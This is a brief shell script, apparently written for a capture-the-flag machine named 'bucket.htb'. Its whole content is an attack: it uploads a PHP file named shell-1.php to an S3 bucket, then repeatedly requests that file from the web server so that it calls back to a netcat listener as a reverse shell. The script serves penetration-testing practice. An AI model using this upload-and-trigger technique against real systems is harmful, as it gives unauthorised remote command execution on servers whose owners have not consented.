#!/bin/sh

aws --endpoint-url http://s3.bucket.htb/ s3 cp shell-1.php s3://adserver/

echo ""
echo "[-] Executing reverse shell...Please run nc listener"
echo "[-] Kill me with Ctrl+C on successful connection"

while [ true ]
do
	curl http://bucket.htb/shell-1.php &> /dev/null
done


